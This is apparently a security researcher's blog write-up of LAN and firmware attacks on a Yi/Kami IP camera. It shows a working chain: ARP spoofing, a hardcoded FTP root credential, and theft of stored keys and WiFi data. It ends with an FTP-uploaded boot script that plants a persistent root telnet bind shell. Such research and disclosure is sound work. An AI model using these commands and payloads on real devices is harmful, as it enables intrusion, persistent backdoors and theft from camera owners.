---
title: "Hacking a Cloud IP Camera, Part 4: The network & LAN Phase Owning the Device Itself"
date: 2026-09-13
draft: false
tags: ["iot-security", "firmware", "yi-iot", "kami-home"]
---

![Hacking a Cloud IP Camera Part 4 The LAN and Firmware Phase](header.jpeg)

## Table of Contents
1. [Introduction](#introduction)
2. [Recon: Three Ports and a Factory Badge](#recon--three-ports-and-a-factory-badge)
3. [FTP: The Front Door Is Unlocked](#ftp--the-front-door-is-unlocked)
4. [The Filesystem Layout](#the-filesystem-layout)
5. [The Configuration Goldmine](#the-configuration-goldmine)
6. [The Camera on the Wire: CS2/TNP Protocol Analysis](#the-camera-on-the-wire--cs2tnp-protocol-analysis)
7. [The Mystery Ports: 6789 and 6790](#the-mystery-ports--6789-and-6790)
8. [The Binaries Talk](#the-binaries-talk)
9. [The Boot Chain](#the-boot-chain)
10. [The LAN Kill Chain: Full Root, No Exploit](#the-lan-kill-chain--full-root--no-exploit)
11. [Findings Summary](#findings-summary)
12. [Closing Thoughts](#closing-thoughts)

## Introduction

Part 1 took the Android app apart. Part 2 went after the cloud and came back with twenty findings  the headline being that one logged URL is a permanent account takeover. Part 3 was the staging QA agent detour. This post is the one I should have written first: **the device itself**.

Same camera on the bench, but now the target is everything that happens without the internet  the local network services, the firmware on the flash, and the boot process.

The short version: **it ends at the perimeter.** The device trusts its local network completely. Hardcoded FTP credentials ship in every unit and grant read *and write* access to the entire filesystem  including the persistent partition that the boot process `source`s shell scripts from, as root. Chained together, that's **persistent root code execution from the LAN with no memory corruption, no exploit development, and no physical access**  an FTP client is the entire toolchain. Add an unsigned firmware update path, an unauthenticated factory command port, cleartext home WiFi credentials sitting on the device, and a P2P wire key that rotates daily but is downloadable by anyone on the network  and the strongest cryptography in the ecosystem turns out to guard the vendor's revenue, not the customer.

All scripts and artifacts referenced below are in the companion repository:

> **PoC repository:** `https://github.com/mikias1943/yi-exploit-scripts/`


## Recon: Three Ports and a Factory Badge

```bash
$ sudo nmap -sS 10.0.0.1/24        # camera identified at 10.0.0.12
$ sudo nmap -sV -p- 10.0.0.12
21/tcp   open  ftp      BusyBox ftpd
6789/tcp open  ibm-db2-admin?     # nmap's guess by port number  it is not DB2
6790/tcp open  unknown
```

Three TCP services. No HTTP, no telnet, no SSH, nothing on common UDP. `6789` and `6790` are proprietary (nmap's "ibm-db2-admin" label is just its port-number lookup  the real attribution comes later, from the firmware).

One infrastructure detail that matters for the traffic analysis below: with the camera and the Kali box both associated to the same access point, a passive capture sees nothing  the AP only delivers unicast frames to the station they belong to. Inserting myself with ARP spoofing instead:

```bash
$ sudo sysctl -w net.ipv4.ip_forward=1
$ sudo bettercap -iface eth0 -eval "net.probe on; set arp.spoof.targets 10.0.0.12; \
    set arp.spoof.fullduplex true; arp.spoof on"
...
[endpoint.new] endpoint 10.0.0.12 detected as 7c:94:9f:03:c8:90 (Shenzhen iComm Semiconductor CO.,LTD).

$ sudo tcpdump -i eth0 -w liveview.pcap "host 10.0.0.12"
851 packets captured          # vs. 0 packets before the MITM
```

The MAC OUI is already a small leak: the camera's radio identity belongs to **Shenzhen iComm Semiconductor**  the same vendor as the `ssv6x5x` WiFi driver sitting in the firmware's module directory. The hardware tells you who built it before any banner does.

## FTP: The Front Door Is Unlocked

Public research on this camera family documents a hardcoded FTP credential pair. It works on my unit:

```bash
$ printf 'USER root\r\nPASS yunyi666\r\nSYST\r\nFEAT\r\nPWD\r\nQUIT\r\n' | nc -w 5 10.0.0.12 21
220 Operation successful
331 Please specify password
230 Operation successful
215 UNIX Type: L8
211-Features:
 EPSV
 PASV
 REST STREAM
 MDTM
 SIZE
211 Ok
257 "/"
221 Operation successful
```

`root:yunyi666`, authenticated. The server is stock BusyBox ftpd running as root **with no chroot**  the FTP root is the filesystem root. (Practical note for anyone reproducing: BSD `ftp`'s `get /etc/passwd` derives the *local* filename from the full remote path and dies with a permission error  that's a client artifact, not server hardening. Use `lftp` or `lcd` + explicit local names.)

First pulls, the identity files:

```
$ cat passwd
root::0:0:root:/:/bin/sh

$ cat shadow
root:$1$6AHjBnTn$LvoexcPTiWwZP5fLfCGdv1
```

An md5crypt root hash, and an `/etc` full of symlinks pointing into `/etc/jffs2`  the persistent, writable partition. That detail is the whole ballgame. Keep it in mind.

## The Filesystem Layout

```
$ cat mounts.txt
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
/dev/mtdblock5 on /usr type squashfs (ro,relatime)
/dev/mtdblock6 on /etc/jffs2 type jffs2 (rw,relatime)
/dev/loop0 on /tmp/ramdisk type vfat (rw,relatime)
tmpfs on /tmp type tmpfs (rw,relatime)
```

- `/` and `/usr`  read-only squashfs. The stock firmware, immutable at runtime.
- `/etc/jffs2` (mtdblock6)  **jffs2, read-write, persistent across reboots.** Every piece of device identity and configuration lives here.
- `/tmp`, `/var`, `/mnt`  tmpfs, volatile.

Bulk pull of the application partition (12.5 MB, 130 files, 181 symlinks):

```bash
$ lftp -u root,yunyi666 -e "set ftp:passive-mode on; mirror -P 4 /usr ~/Desktop/YI/camfs_usr; quit" ftp://10.0.0.12
12503458 bytes transferred in 135 seconds (90.7 KiB/s)

$ cat camfs_usr/fw_version
6.0.05.10_202211081332

$ ls camfs_usr/modules
akcamera.ko  ak_info_dump.ko  atbm603x_wifi_usb.ko  g_file_storage.ko
g_mass_storage.ko  otg-hs.ko  rtl8188fu.ko  sensor_gc1034.ko
sensor_gc1054.ko  sensor_h62.ko  sensor_h63.ko  ssv6x5x.ko
ssv6x5x-sw.bin  udc.ko  usbburn.ko
```

The module directory is a BOM manifest: three different WiFi chipsets supported (`atbm603x`, `rtl8188fu`, `ssv6x5x`), four image sensor options, and a full **USB gadget stack** (`udc.ko`, `g_mass_storage.ko`, `usbburn.ko`)  the factory programming interface, shipped in retail firmware.

## The Configuration Goldmine

Everything in this section came down over FTP. No shell, no exploit  just `RETR`.

**Device identity and cloud keys  `/etc/jffs2/yi.conf`:**

```ini
dev_id=A1769004XXXXXXXXXXXX
dev_key=AulRee4ziBbADv2r
p2pid=TNPXGAR-583857-XXXXX
bindkey=USVH0N17C0H65GpO
```

The complete device/cloud identity set in one 105-byte file: device ID, device key, P2P UID, and the bindkey that ties the unit to its owner's cloud account.

**Cleartext WiFi credentials and the rotating P2P wire key  `/etc/jffs2/yi_cfg.ini`:**

```ini
ssid = NETGEAR57
passwd = [REDACTED  home WiFi password, sitting in plaintext on the camera]
lastP2pPwd = IiPDXY2T6fT3FLn
lastUpdateP2pPwdTime = 1789235587
```

Two independent problems. **First:** the camera stores the customer's home WiFi password in cleartext. Compromising the camera  which, per the FTP section, is everyone on the LAN  hands over the keys to the network it lives on. The camera is not an endpoint; it's a pivot.

**Second:** `lastP2pPwd` is the live P2P wire-authentication key  the key behind the HMAC-SHA1 `account,digest` handshake reverse-engineered in Part 1  and it **rotates** (`lastUpdateP2pPwdTime` is an epoch timestamp from the day before my Part 1 testing). That retroactively explains Part 1's failed rogue session: the key I used had already been rotated out. But a rotating credential that every LAN client can simply *download over FTP* is not a control  it's key distribution for attackers.

**The pairing-mode access point  `hostapd.conf` + `udhcpd.conf`:**

```ini
# hostapd.conf
ssid=AKIPC
wpa=0                 # completely OPEN network  no encryption at all
wps_state=2
driver=rtl871xdrv

# udhcpd.conf  pairing-mode DHCP server
start       192.168.10.20
end         192.168.10.254
interface   wlan0
opt router  192.168.10.1
```

In pairing mode the camera broadcasts an **unencrypted** `AKIPC` access point and serves DHCP leases on `192.168.10.0/24`, with itself as `192.168.10.1`. Anything that forces the camera back into pairing mode  a deauth flood against its home network being the obvious candidate  exposes an open AP wired directly into the camera's configuration services.

**Factory DNA  `/usr/local/factory_cfg.ini`:**

```ini
[global]
user = admin
secret = admin
dev_name = 小K互联网摄像机
uid_name = danale.conf

[cloud]
dana = 1
onvif = 0
rtsp = 0

[softap]
s_ssid = AKIPC_XXX
s_password = 12345678
```

This file is a fossil record of the supply chain: factory `admin:admin` credentials, the Chinese-market product name ("小K互联网摄像机"  "Little K Internet Camera"), the factory-default softAP password `12345678`, and the lineage tell  `uid_name = danale.conf`. This firmware is built on the **Danale white-label P2P platform**, the stack behind a generation of no-name IP cameras. ONVIF and RTSP are compiled in but shipped disabled.

## The Camera on the Wire: CS2/TNP Protocol Analysis

With the MITM in place, carving the pcap for the UID string pulls out the camera's heartbeat to its relay infrastructure:

```python
import re
data = open("liveview.pcap","rb").read()
for m in re.finditer(b"TNPXGAR", data):
    s = max(0, m.start()-64)
    chunk = data[s:m.start()+120]
    print(f"--- offset {m.start()} ---")
    print(chunk.hex())
```

Every hit is the same message shape  UDP to Alibaba Cloud TNP relays on **port 32100** (`47.91.91.240`, `47.254.39.207`, `8.219.82.94`):

```
UDP 10.0.0.12:28220 → 47.91.91.240:32100

f1 14 00 68                                     ← CS2 message header (type f1 14, len 0x68)
54 4e 50 58 47 41 52                            ← "TNPXGAR"
00 00 08 e8 b1                                  ← 0x08E8B1 = 583857 (middle UID segment, binary)
4d 45 57 4a 5a                                  ← "MEWJZ"
00 00 00 02 d2 03 04 00 02 3c 6e 0c 00 00 0a 00 00 00 00 00 00 00 00 00
31 37 38 39 ...                                 ← "1789242151932:FM6uuD8AXxx0Qlf7J15D0F7B32074600B84BA0D513C7056087"
```

Reconstructed: the device's P2P UID travels split as `prefix(TNPXGAR) + u32(583857) + suffix(MEWJZ)`  the dashed string is presentation only. Every heartbeat appends a **millisecond timestamp and a 50-character session ticket**, and consecutive heartbeats carry fresh tickets  the cloud issues per-message session material and the device echoes it. A second message type (`f1 41`) goes to a different relay (`223.167.60.170`) with a binary-only payload.

Three observations from the wire:

1. **Device identity and liveness transit in cleartext**  UID, timing, session cadence. Anyone on the path can fingerprint and track a specific camera.
2. **The replay-resistant part of the protocol lives server-side.** The tickets are cloud-issued session material, not device-derived.
3. The relay network is a handful of hardcoded Alibaba Cloud IPs (confirmed in the `cloudAPI` binary below)  a centralized choke point for a system marketed as peer-to-peer.

## The Mystery Ports: 6789 and 6790

Nmap didn't know them. The firmware does. Attribution by port constant (6789 = `0x1A85`, 6790 = `0x1A86`, little-endian):

```bash
$ grep -rl $'\x85\x1a\x00\x00' camfs_usr/bin camfs_usr/sbin
camfs_usr/bin/daemon

$ grep -rl $'\x86\x1a\x00\x00' camfs_usr/bin camfs_usr/sbin
camfs_usr/bin/daemon
camfs_usr/bin/anyka_ipc
```

**`daemon` on 6789  an unauthenticated factory command service.** `daemon` is the second process started at boot and doubles as the watchdog manager (`killall -12 daemon` is how the rest of the system asks it to stop the watchdog). Its string table describes the service completely:

```
accept
listen
[%s:%d] listen: %s
[%s:%d] accept: %s
[%s:%d] cmd: %s
[%s:%d] invalid cmd
[%s:%d] unsupport opt: %s
[%s:%d] cmd len is greate than %d
ak_cmd_exec
ak_cmd_exec.c
reboot -f
/usr/sbin/recover_cfg.sh
/usr/sbin/wifi_manage.sh stop
[%s:%d] *** recover system config ***
Receive Finish Signal, reboot the device.
Manual test mode, it has send report to PC
```

A TCP listener on `0.0.0.0:6789` that reads command strings and dispatches them to `ak_cmd_exec`  which links `system()`. The reachable command surface includes **device reboot, factory config recovery, and WiFi teardown**. There is no authentication logic anywhere in the string table  no login, no token, no HMAC. This is a production-line service that shipped in retail firmware, listening on every interface. Behavior matches: it accepts connections silently and waits for the client to speak first.

```bash
$ curl -v --max-time 5 http://10.0.0.12:6789/
* Connected to 10.0.0.12 port 6789
> GET / HTTP/1.1
* Operation timed out after 5002 milliseconds with 0 bytes received
```

**6790  a binary service with an availability problem.** It answered exactly one probe, with non-HTTP binary data:

```bash
$ curl -v --max-time 5 http://10.0.0.12:6790/
* Connected to 10.0.0.12 port 6790
> GET / HTTP/1.1
* Received HTTP/0.9 when not allowed      # ← answered with non-HTTP bytes
```

…then died. Permanently, until reboot:

```bash
$ for i in 1 2 3; do nc -w 3 10.0.0.12 6790 < /dev/null | xxd | head -8; echo ---; done
---
(UNKNOWN) [10.0.0.12] 6790 (?) : Connection refused
---
(UNKNOWN) [10.0.0.12] 6790 (?) : Connection refused
```

The device's own socket table corroborates the fragility: listeners accumulating `CLOSE_WAIT` sockets from light probing. From a pure availability standpoint, the LAN attack surface includes a denial of service that requires nothing more than a few TCP connections  no spoofing, no flood, just ordinary connection churn.

**The localhost IPC mesh.** The socket table also exposes the internal service mesh: heavy `TIME_WAIT` churn on `127.0.0.1:8782` and a listener on `127.0.0.1:8899`  the userland components (`anyka_ipc`, `cloudAPI`, `daemon`, `cmd_serverd`) coordinate over loopback TCP. Not reachable from the network, but the moment any code execution lands, these unauthenticated internal channels become the post-exploitation layer.

## The Binaries Talk

Every vendor binary is a 32-bit ARM/uClibc ELF  and the two most important ones shipped **with debug info, unstripped**:

```bash
$ file camfs_usr/bin/anyka_ipc camfs_usr/bin/daemon camfs_usr/bin/cloudAPI
camfs_usr/bin/anyka_ipc: ELF 32-bit LSB executable, ARM, EABI5, with debug_info, not stripped
camfs_usr/bin/daemon:    ELF 32-bit LSB executable, ARM, EABI5, with debug_info, not stripped
camfs_usr/bin/cloudAPI:  ELF 32-bit LSB executable, ARM, EABI5, stripped
```

**`anyka_ipc`  the entire remote-control surface, by symbol name.** The main application (1.19 MB) exports its full P2P command set:

```bash
$ nm camfs_usr/bin/anyka_ipc | grep -iE 'yi_p2p_on'
0003410c T yi_p2p_on_auth
0003401c T yi_p2p_on_new_session
00036ba8 T yi_p2p_on_format_sd
00039464 T yi_p2p_on_reset_device
00036100 T yi_p2p_on_restart_ap
00035f68 T yi_p2p_on_get_ap_conf
000352c0 T yi_p2p_on_get_dev_info
00034f80 T yi_p2p_on_get_record_events
000366c4 T yi_p2p_on_get_motion_detect_cfg
000374b8 T yi_p2p_on_ptz_direction_ctrl
000370fc T yi_p2p_on_ptz_preset_add
00038e74 T yi_p2p_on_set_abnormal_sound
... (40+ handlers)
```

The log strings are even more candid  the P2P "set WiFi" handler logs incoming credentials, including the AP bindkey, in plaintext:

```
yi_p2p_on_set_wifi_info: ssid:%s,pwd:%s,ap_bindkey:%s
p2p listen license:(%s),test_tnp_did:(%s)
check p2p login fail %d/%d
```

**`cloudAPI`  the registration protocol in plaintext strings:**

```
%s?hmac=%s&seq=9&uid=%s&password=%s&version=%s&model=0&port=0&mac=%s&packetloss=%s&p2pconnect=%s&p2pconnect_success=%s&tfstat=%s&timestamp=%u&ext_info=%s
{"p2p_encrypt":"%s","ssid":"%s","mac":"%s","ip":"%s","signal_quality":"%s","powerstate":"%s"}
114.114.114.114,8.8.8.8,8.208.8.243,47.89.253.148,47.74.247.115,47.104.92.112,106.15.57.250,202.96.209.133
/home/tmpfs/API_DEBUG
141=CMD_do_tnp_on_line
```

The HMAC-signed device-registration template, the telemetry JSON shape, a debug trigger file  and a **hardcoded fallback list of cloud/DNS IPs**. Interfere with DNS and the camera still knows exactly where home is.

**`crypt_file`  a command-injection-shaped utility:**

```
system
basename
unlink
/tmp/%s.crypt_tmp_file
mv %s %s
```

The config encryption helper shells out through `system()` with `mv %s %s` format strings. Whether network-reachable input ever reaches those format specifiers is a Ghidra question  and with DWARF debug info intact, answering it is hours, not days.

## The Boot Chain

`/usr/sbin/service.sh` runs the show at boot. Three things fall out of reading it carefully.

**The normal chain:**

```sh
cmd_serverd                        # IPC command server first
killall telnetd                    # telnet explicitly killed at boot
echo "/mnt/core_%e_%p_%t" > /proc/sys/kernel/core_pattern
daemon                             # watchdog + port 6789
/usr/sbin/anyka_ipc.sh start       # → camera.sh start()
```

And inside `camera.sh start()`:

```sh
start ()
{
        pid=`pgrep anyka_ipc`
    if [ "$pid" = "" ]
    then
            source /etc/jffs2/time_zone.sh     # ← sourced. as root. from jffs2.
            anyka_ipc &
        fi
}
```

**The SD-card execution paths**, from the same script:

```sh
if test -d /mnt/Factory ;then FACTORY_TEST=1 ...      # runs /mnt/Factory/config.sh
if test -d /mnt/debug ;  then DEBUG_MODE=1  ...       # runs /mnt/debug/config.sh
if test -d /mnt/update ; then UPDATE_MODE=1 ...       # runs /usr/sbin/update.sh
```

A microSD card containing a `debug/` directory gets `/mnt/debug/config.sh` executed **as root at every boot**. Same for `Factory/`.

**The unsigned update path.** `update.sh` consumes `update.tar` from the SD card or `/tmp`:

```sh
tar -xvf /tmp/update.tar -C /tmp/
...
if [ -e ${DIR1}/${ZMD5} ];then
    result=`md5sum -c ${DIR1}/${ZMD5} | grep OK`     # ← the entire integrity model
fi
updater local KERNEL=${DIR1}/${VAR1}                  # flashes uImage
updater local B=${DIR1}/${VAR3}                       # flashes usr.sqsh4
updater local C=${DIR1}/${VAR4}                       # flashes usr.jffs2
```

The `.md5` files **ship inside the same attacker-controlled tarball**. There is no signature, no key, no chain of trust. The version gate is a string comparison that any crafted `fw_version` file satisfies. An `update.tar` on an SD card reflashes the kernel, rootfs, and config partition with whatever you bring  total, persistent device ownership.

## The LAN Kill Chain: Full Root, No Exploit

Putting the confirmed pieces together, step by step.

**Step 1  read access:** `root:yunyi666` over FTP, filesystem root reachable (above).

**Step 2  write access, verified on-device:**

```bash
$ echo "pwn-test" > /tmp/ftp_test.txt
$ lftp -u root,yunyi666 -e "put /tmp/ftp_test.txt -o /etc/jffs2/ftp_test.txt; ls /etc/jffs2/; quit" ftp://10.0.0.12
9 bytes transferred
-rw-r--r--    1 root     root             9 Sep 12 20:01 ftp_test.txt
```

BusyBox ftpd, running as root with no chroot, accepts `PUT` into `/etc/jffs2`  the persistent, boot-read partition.

**Step 3  the sink, confirmed in the boot scripts:** `camera.sh` `source`s `/etc/jffs2/time_zone.sh` as root on every camera-service start.

**Step 4  payload staged:**

```bash
$ printf 'export TZ=GMT-08:00\n/bin/busybox telnetd -l /bin/sh -p 2323 &\n' > /tmp/tz.sh
$ lftp -u root,yunyi666 -e "put /tmp/tz.sh -o /etc/jffs2/time_zone.sh; cat /etc/jffs2/time_zone.sh; quit" ftp://10.0.0.12
```

The payload preserves the original `TZ` export  normal operation is untouched  and adds a root bind shell on port 2323 at next service start. jffs2 survives reboots, and the update path is specifically designed to preserve it.

**Step 5  trigger.** Any camera-service restart fires it: a power cycle, an app-initiated reboot  or the factory command daemon's own `reboot` functionality on port 6789, which is itself unauthenticated and LAN-reachable.

The attack narrative from the attacker's chair: join the victim's network (or the open `AKIPC` pairing AP), connect to FTP with the credential pair that ships in every unit, overwrite one config file, wait for  or cause  a reboot. Root shell, persistent, on a camera that keeps working perfectly and reporting healthy to its owner. No memory corruption. No exploit development. Just a `PUT`.

## Findings Summary

| ID | Finding | Severity |
|---|---|---|
| C-30 | FTP with hardcoded, publicly documented credentials (`root:yunyi666`), running as root with no chroot  full filesystem read for any LAN client | **High** |
| C-31 | FTP **write** access to the persistent jffs2 partition (`/etc/jffs2`), which holds device identity, credentials, and boot-read configuration | **High** |
| C-32 | Boot-time root code execution: `camera.sh` `source`s `/etc/jffs2/time_zone.sh` as root  chained with C-30/C-31 this is unauthenticated, persistent LAN RCE (payload staged and verified on-device) | **Critical** |
| C-33 | Firmware update path with no authenticity verification  MD5 "checks" against `.md5` files inside the same attacker-controlled `update.tar`; reflashes kernel, rootfs, and config partitions | **High** |
| C-34 | SD-card boot-execution paths: `/mnt/debug/config.sh` and `/mnt/Factory/config.sh` executed as root at boot if present | **Medium** |
| C-35 | Customer home WiFi credentials stored in cleartext (`yi_cfg.ini`)  camera compromise is a home-network pivot | **Medium** |
| C-36 | The P2P wire-authentication key (`lastP2pPwd`) is stored on-device, rotates daily, and is FTP-readable  the Part 1 rogue-session barrier reduces to a file download for any LAN client | **High** |
| C-37 | Unauthenticated factory command daemon on `0.0.0.0:6789`  dispatch to `ak_cmd_exec`/`system()` with reboot, config-recovery, and WiFi-teardown commands in its string table | **High** |
| C-38 | Service fragility: the 6790 service dies permanently under trivial unauthenticated connection churn; listeners leak `CLOSE_WAIT` sockets  remote DoS | **Medium** |
| C-39 | Cleartext P2P heartbeat metadata  device UID, liveness, and session cadence visible on the wire to Alibaba-hosted TNP relays (32100/udp) | Low |
| C-40 | Pairing mode exposes an unencrypted `AKIPC` access point (`wpa=0`) with an on-device DHCP pool; factory-default softAP password `12345678` in `factory_cfg.ini` | **Medium** |
| C-41 | Danale white-label P2P platform lineage; factory `admin:admin` credentials in `factory_cfg.ini` | Informational |
| C-42 | `cloudAPI` embeds a hardcoded fallback list of cloud/DNS IPs and the cleartext registration request template | Low |
| C-43 | Production firmware ships unstripped with full DWARF debug info  drastically lowers the cost of further vulnerability discovery | Informational |

## Closing Thoughts

Part 2's cloud phase required understanding replay windows, canonicalization quirks, and session ladders. This phase required an FTP client.

**Next phase: hardware.** The unit is already in pieces on the bench  UART, the raw flash, and that factory USB gadget stack (`usbburn.ko`) are the obvious doors. Part 5 will be written with a soldering iron in frame.

*Writeup by Mikias*
